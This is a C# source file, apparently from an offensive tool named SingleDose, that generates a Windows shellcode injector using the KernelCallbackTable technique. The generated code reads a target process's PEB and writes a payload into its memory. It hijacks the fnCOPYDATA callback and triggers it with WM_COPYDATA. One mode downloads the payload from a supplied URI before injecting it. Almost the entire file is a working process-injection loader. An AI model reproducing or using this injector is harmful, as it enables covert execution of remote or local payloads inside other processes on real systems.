namespace SingleDose
{
    class KernelCallbackTable
    {
        public static string STATICMODE = @"
        Process proc = Process.GetProcessById( {{PROCESSID}} );
        System.Collections.Generic.List<byte> payloadList = new System.Collections.Generic.List<byte>();
        {{SHELLCODE}}
        byte[] payload = payloadList.ToArray();
            ";
        public static string DYNAMICMODE = @"
        if (args.Contains(""-h"", StringComparer.OrdinalIgnoreCase) || !args.Contains(""-pid"", StringComparer.OrdinalIgnoreCase) || !args.Contains(""-bin"", StringComparer.OrdinalIgnoreCase)) {
            Console.WriteLine(""-pid: Process ID of target process \n-bin: Path to shellcode"");
            Environment.Exit(0);
        }
        ArgValues parsedArgs = ArgParse(args);
        Process proc = parsedArgs.Pid; 
        byte[] payload = System.IO.File.ReadAllBytes(parsedArgs.binPath);
        ";

        public static string DOWNLOADMODE = @"
        if (args.Contains(""-h"", StringComparer.OrdinalIgnoreCase) || !args.Contains(""-pid"", StringComparer.OrdinalIgnoreCase) || !args.Contains(""-uri"", StringComparer.OrdinalIgnoreCase)) {
            Console.WriteLine(""-PID: Absolute filepath used to spawn process \n-URI: URI to download"");
            Environment.Exit(0);
        }
        ArgValues parsedArgs = ArgParse(args);
        Process proc = parsedArgs.Pid;
        System.Net.WebClient wc = new System.Net.WebClient();
        byte[] payload;
        payload = wc.DownloadData(parsedArgs.DownloadURI);
            
        if (payload.Length == 0)
        {
            Console.WriteLine(""[!] Error downloading"");
        }
        ";

        public static string DYNAMICARGPARSE = @"
        public class ArgValues
        {
            public Process Pid;
            public string binPath;
        }

        static ArgValues ArgParse(string[] arguments)
        {
            ArgValues collection = new ArgValues();

            if (arguments.Count() != 0)
            {
                for (var i = 0; i < arguments.Count(); i++)
                {
                    if (arguments[i].ToUpper().StartsWith(""-PID"") && arguments[i + 1] != null)
                    {
                        try 
                        {
                            collection.Pid = Process.GetProcessById(Int32.Parse(arguments[i+1]));
                        }
                        catch
                        {
                            Console.WriteLine(""[!] PID Error"");
                        }
                    }

                    if (arguments[i].ToUpper().StartsWith(""-BIN"") && arguments[i + 1] != null)
                    {
                        if (System.IO.File.Exists(arguments[i + 1]))
                        {
                            collection.binPath = arguments[i + 1];
                        }
                        else if (!System.IO.File.Exists(arguments[i + 1]))
                        {
                            Console.WriteLine(""[!] Invalid bin path supplied."");
                            Environment.Exit(1);
                        }
                    }
                }
            }
            else
            {
                Console.WriteLine(""[!] No args specified"");
            }

            return collection;
        }";

        public static string DOWNLOADARGPARSE = @"
        public class ArgValues
        {
            public Process Pid;
            public string DownloadURI;
        }

        static ArgValues ArgParse(string[] arguments)
        {
            ArgValues collection = new ArgValues();

            if (arguments.Count() != 0)
            {
                for (var i = 0; i < arguments.Count(); i++)
                {
                    if (arguments[i].ToUpper().StartsWith(""-PID"") && arguments[i + 1] != null)
                    {
                        try 
                        {
                            collection.Pid = Process.GetProcessById(Int32.Parse(arguments[i+1]));
                        }
                        catch
                        {
                            Console.WriteLine(""[!] PID Error"");
                        }
                    }

                    if (arguments[i].ToUpper().StartsWith(""-URI"") && arguments[i + 1] != null)
                    {
                        collection.DownloadURI = arguments[i + 1];
                    }
                }
            }
            else
            {
                Console.WriteLine(""[!] No args specified"");
            }
            return collection;
        }";

        public static string BODY = @"
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;

namespace {{NAMESPACE}}
{
    class Program
    {
        static void Main(string[] args)
        {
            {{TRIGGER}}
            {{MODE}}

            PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
            int retLength = 0;
            NtQueryInformationProcess(proc.Handle, PROCESSINFOCLASS.ProcessBasicInformation, out pbi, Marshal.SizeOf(pbi), out retLength);
            if (retLength == 0)
            {
                Console.WriteLine(""[!] NtQueryInformationProcess: error retrieving PEB Address. Exiting..."");
                Environment.Exit(1);
            }
            IntPtr NumBytesRead;
            byte[] bPEB = new byte[0x5e];
            ReadProcessMemory(proc.Handle, pbi.PebBaseAddress, bPEB, bPEB.Length, out NumBytesRead);
            if (NumBytesRead.ToInt64() == 0)
            {
                Console.WriteLine(""[!] ReadProcessMemory: error reading PEB. Exiting..."");
                Environment.Exit(1);
            }
            GCHandle pPEB = GCHandle.Alloc(bPEB, GCHandleType.Pinned);
            PEB sPEB = (PEB)Marshal.PtrToStructure(pPEB.AddrOfPinnedObject(), typeof(PEB));
            KernelCallBackTable sKCT = new KernelCallBackTable();
            byte[] bKCT = new byte[Marshal.SizeOf(sKCT)];
            ReadProcessMemory(proc.Handle, sPEB.KernelCallbackTable, bKCT, Marshal.SizeOf(sKCT), out NumBytesRead);
            if (NumBytesRead.ToInt64() == 0)
            {
                Console.WriteLine(""[!] ReadProcessMemory: error reading kernel callback table. Exiting..."");
                Environment.Exit(1);
            }
            pPEB.Free();

            GCHandle pKCT = GCHandle.Alloc(bKCT, GCHandleType.Pinned);
            sKCT = (KernelCallBackTable)Marshal.PtrToStructure(pKCT.AddrOfPinnedObject(), typeof(KernelCallBackTable));
            pKCT.Free();
            IntPtr hPayloadAlloc = VirtualAllocEx(proc.Handle, IntPtr.Zero, (uint)payload.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteRead);
            IntPtr NumBytesWritten;
            GCHandle pPayload = GCHandle.Alloc(payload, GCHandleType.Pinned);
            WriteProcessMemory(proc.Handle, hPayloadAlloc, pPayload.AddrOfPinnedObject(), payload.Length, out NumBytesWritten);
            if (NumBytesWritten.ToInt64() == 0)
            {
                Console.WriteLine(""[!] WriteProcessMemory: error writing payload to process. Exiting..."");
                Environment.Exit(1);
            }
            pPayload.Free();
            sKCT.fnCOPYDATA = hPayloadAlloc;
            IntPtr hNewKCTAlloc = VirtualAllocEx(proc.Handle, IntPtr.Zero, (uint)Marshal.SizeOf(sKCT), AllocationType.Reserve | AllocationType.Commit, MemoryProtection.ReadWrite);
            IntPtr pUpdatedKCT = Marshal.AllocHGlobal(Marshal.SizeOf(sKCT));
            Marshal.StructureToPtr(sKCT, pUpdatedKCT, true);
            WriteProcessMemory(proc.Handle, hNewKCTAlloc, pUpdatedKCT, Marshal.SizeOf(sKCT), out NumBytesWritten);
            if (NumBytesWritten.ToInt64() == 0)
            {
                Console.WriteLine(""[!] WriteProcessMemory: error writing new kernel callback table to process. Exiting..."");
                Environment.Exit(1);
            }

            int KCTOffset = 0x58;
            byte[] bNewKCTAllocAddr = BitConverter.GetBytes(hNewKCTAlloc.ToInt64());
            GCHandle pNewTableToWrite = GCHandle.Alloc(bNewKCTAllocAddr, GCHandleType.Pinned);
            WriteProcessMemory(proc.Handle, (IntPtr)(pbi.PebBaseAddress.ToInt64() + KCTOffset), pNewTableToWrite.AddrOfPinnedObject(), 8, out NumBytesWritten);
            if (NumBytesWritten.ToInt64() == 0)
            {
                Console.WriteLine(""[!] WriteProcessMemory: error updating the PEB with the address of the updated kernel callback table. Exiting..."");
                Environment.Exit(1);
            }
            pNewTableToWrite.Free();

            COPYDATASTRUCT sCDS = new COPYDATASTRUCT();
            uint WM_COPYDATA = 0x004A;
            SendMessage(proc.MainWindowHandle, WM_COPYDATA, IntPtr.Zero, ref sCDS);

            WriteProcessMemory(proc.Handle, (IntPtr)(pbi.PebBaseAddress.ToInt64() + KCTOffset), sPEB.KernelCallbackTable, 8, out NumBytesWritten);
            if (NumBytesWritten.ToInt64() == 0)
            {
                Console.WriteLine(""[!] WriteProcessMemory: error restoring original kernel callback table. Exiting..."");
                Environment.Exit(1);
            }
        }

        {{ARGS}}

        #region StructsEnums
         
        [StructLayout(LayoutKind.Sequential)]
        private struct PEB 
        {
            public byte InheritedAddressSpace;
            public byte ReadImageFileExecOptions;
            public byte BeingDebugged;
            public byte Spare;
            public IntPtr Mutant;
            public IntPtr ImageBaseAddress;
            public IntPtr Ldr;             
            public IntPtr ProcessParameters;
            public IntPtr SubSystemData;    
            public IntPtr ProcessHeap;      
            public IntPtr FastPebLock;
            public IntPtr FastPebLockRoutine;
            public IntPtr FastPebUnlockRoutine;
            public ulong EnvironmentUpdateCount;
            public IntPtr KernelCallbackTable;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct KernelCallBackTable
        {
            public IntPtr fnCOPYDATA;
            public IntPtr fnCOPYGLOBALDATA;
            public IntPtr fnDWORD;
            public IntPtr fnNCDESTROY;
            public IntPtr fnDWORDOPTINLPMSG;
            public IntPtr fnINOUTDRAG;
            public IntPtr fnGETTEXTLENGTHS;
            public IntPtr fnINCNTOUTSTRING;
            public IntPtr fnPOUTLPINT;
            public IntPtr fnINLPCOMPAREITEMSTRUCT;
            public IntPtr fnINLPCREATESTRUCT;
            public IntPtr fnINLPDELETEITEMSTRUCT;
            public IntPtr fnINLPDRAWITEMSTRUCT;
            public IntPtr fnPOPTINLPUINT;
            public IntPtr fnPOPTINLPUINT2;
            public IntPtr fnINLPMDICREATESTRUCT;
            public IntPtr fnINOUTLPMEASUREITEMSTRUCT;
            public IntPtr fnINLPWINDOWPOS;
            public IntPtr fnINOUTLPPOINT5;
            public IntPtr fnINOUTLPSCROLLINFO;
            public IntPtr fnINOUTLPRECT;
            public IntPtr fnINOUTNCCALCSIZE;
            public IntPtr fnINOUTLPPOINT5_;
            public IntPtr fnINPAINTCLIPBRD;
            public IntPtr fnINSIZECLIPBRD;
            public IntPtr fnINDESTROYCLIPBRD;
            public IntPtr fnINSTRING;
            public IntPtr fnINSTRINGNULL;
            public IntPtr fnINDEVICECHANGE;
            public IntPtr fnPOWERBROADCAST;
            public IntPtr fnINLPUAHDRAWMENU;
            public IntPtr fnOPTOUTLPDWORDOPTOUTLPDWORD;
            public IntPtr fnOPTOUTLPDWORDOPTOUTLPDWORD_;
            public IntPtr fnOUTDWORDINDWORD;
            public IntPtr fnOUTLPRECT;
            public IntPtr fnOUTSTRING;
            public IntPtr fnPOPTINLPUINT3;
            public IntPtr fnPOUTLPINT2;
            public IntPtr fnSENTDDEMSG;
            public IntPtr fnINOUTSTYLECHANGE;
            public IntPtr fnHkINDWORD;
            public IntPtr fnHkINLPCBTACTIVATESTRUCT;
            public IntPtr fnHkINLPCBTCREATESTRUCT;
            public IntPtr fnHkINLPDEBUGHOOKSTRUCT;
            public IntPtr fnHkINLPMOUSEHOOKSTRUCTEX;
            public IntPtr fnHkINLPKBDLLHOOKSTRUCT;
            public IntPtr fnHkINLPMSLLHOOKSTRUCT;
            public IntPtr fnHkINLPMSG;
            public IntPtr fnHkINLPRECT;
            public IntPtr fnHkOPTINLPEVENTMSG;
            public IntPtr xxxClientCallDelegateThread;
            public IntPtr ClientCallDummyCallback;
            public IntPtr fnKEYBOARDCORRECTIONCALLOUT;
            public IntPtr fnOUTLPCOMBOBOXINFO;
            public IntPtr fnINLPCOMPAREITEMSTRUCT2;
            public IntPtr xxxClientCallDevCallbackCapture;
            public IntPtr xxxClientCallDitThread;
            public IntPtr xxxClientEnableMMCSS;
            public IntPtr xxxClientUpdateDpi;
            public IntPtr xxxClientExpandStringW;
            public IntPtr ClientCopyDDEIn1;
            public IntPtr ClientCopyDDEIn2;
            public IntPtr ClientCopyDDEOut1;
            public IntPtr ClientCopyDDEOut2;
            public IntPtr ClientCopyImage;
            public IntPtr ClientEventCallback;
            public IntPtr ClientFindMnemChar;
            public IntPtr ClientFreeDDEHandle;
            public IntPtr ClientFreeLibrary;
            public IntPtr ClientGetCharsetInfo;
            public IntPtr ClientGetDDEFlags;
            public IntPtr ClientGetDDEHookData;
            public IntPtr ClientGetListboxString;
            public IntPtr ClientGetMessageMPH;
            public IntPtr ClientLoadImage;
            public IntPtr ClientLoadLibrary;
            public IntPtr ClientLoadMenu;
            public IntPtr ClientLoadLocalT1Fonts;
            public IntPtr ClientPSMTextOut;
            public IntPtr ClientLpkDrawTextEx;
            public IntPtr ClientExtTextOutW;
            public IntPtr ClientGetTextExtentPointW;
            public IntPtr ClientCharToWchar;
            public IntPtr ClientAddFontResourceW;
            public IntPtr ClientThreadSetup;
            public IntPtr ClientDeliverUserApc;
            public IntPtr ClientNoMemoryPopup;
            public IntPtr ClientMonitorEnumProc;
            public IntPtr ClientCallWinEventProc;
            public IntPtr ClientWaitMessageExMPH;
            public IntPtr ClientWOWGetProcModule;
            public IntPtr ClientWOWTask16SchedNotify;
            public IntPtr ClientImmLoadLayout;
            public IntPtr ClientImmProcessKey;
            public IntPtr fnIMECONTROL;
            public IntPtr fnINWPARAMDBCSCHAR;
            public IntPtr fnGETTEXTLENGTHS2;
            public IntPtr fnINLPKDRAWSWITCHWND;
            public IntPtr ClientLoadStringW;
            public IntPtr ClientLoadOLE;
            public IntPtr ClientRegisterDragDrop;
            public IntPtr ClientRevokeDragDrop;
            public IntPtr fnINOUTMENUGETOBJECT;
            public IntPtr ClientPrinterThunk;
            public IntPtr fnOUTLPCOMBOBOXINFO2;
            public IntPtr fnOUTLPSCROLLBARINFO;
            public IntPtr fnINLPUAHDRAWMENU2;
            public IntPtr fnINLPUAHDRAWMENUITEM;
            public IntPtr fnINLPUAHDRAWMENU3;
            public IntPtr fnINOUTLPUAHMEASUREMENUITEM;
            public IntPtr fnINLPUAHDRAWMENU4;
            public IntPtr fnOUTLPTITLEBARINFOEX;
            public IntPtr fnTOUCH;
            public IntPtr fnGESTURE;
            public IntPtr fnPOPTINLPUINT4;
            public IntPtr fnPOPTINLPUINT5;
            public IntPtr xxxClientCallDefaultInputHandler;
            public IntPtr fnEMPTY;
            public IntPtr ClientRimDevCallback;
            public IntPtr xxxClientCallMinTouchHitTestingCallback;
            public IntPtr ClientCallLocalMouseHooks;
            public IntPtr xxxClientBroadcastThemeChange;
            public IntPtr xxxClientCallDevCallbackSimple;
            public IntPtr xxxClientAllocWindowClassExtraBytes;
            public IntPtr xxxClientFreeWindowClassExtraBytes;
            public IntPtr fnGETWINDOWDATA;
            public IntPtr fnINOUTSTYLECHANGE2;
            public IntPtr fnHkINLPMOUSEHOOKSTRUCTEX2;
        }

        private struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr ExitStatus;
            public IntPtr PebBaseAddress;
            public UIntPtr AffinityMask;
            public int BasePriority;
            public UIntPtr UniqueProcessId;
            public UIntPtr InheritedFromUniqueProcessId;
        }

        private enum PROCESSINFOCLASS
        {
            ProcessBasicInformation = 0x00,
        };

        [Flags]
        private enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000
        }

        [Flags]
        private enum MemoryProtection
        {
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ReadWrite = 0x04
        }

        [StructLayout(LayoutKind.Sequential)]
        struct COPYDATASTRUCT
        {
            public IntPtr dwData;
            public int cbData;
            public string lpData;
        }
        #endregion

        #region API

        //https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess
        [DllImport(""ntdll.dll"", SetLastError = true)]
        static extern int NtQueryInformationProcess(IntPtr hProcess,
            PROCESSINFOCLASS pic,
            out PROCESS_BASIC_INFORMATION pbi,
            int cb,
            out int pSize);

        //https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory
        [DllImport(""kernel32.dll"", SetLastError = true)]
        public static extern bool ReadProcessMemory(IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            Int32 nSize,
            out IntPtr lpNumberOfBytesRead);

        //https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
        [DllImport(""kernel32.dll"", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            AllocationType flAllocationType,
            MemoryProtection flProtect);

        //https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
        [DllImport(""kernel32.dll"")]
        static extern bool WriteProcessMemory(
             IntPtr hProcess,
             IntPtr lpBaseAddress,
             IntPtr lpBuffer,
             Int32 nSize,
             out IntPtr lpNumberOfBytesWritten);

        //https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-sendmessage
        [DllImport(""user32.dll"")]
        static extern int SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, ref COPYDATASTRUCT lParam);
        #endregion
    }
}";
    }
}
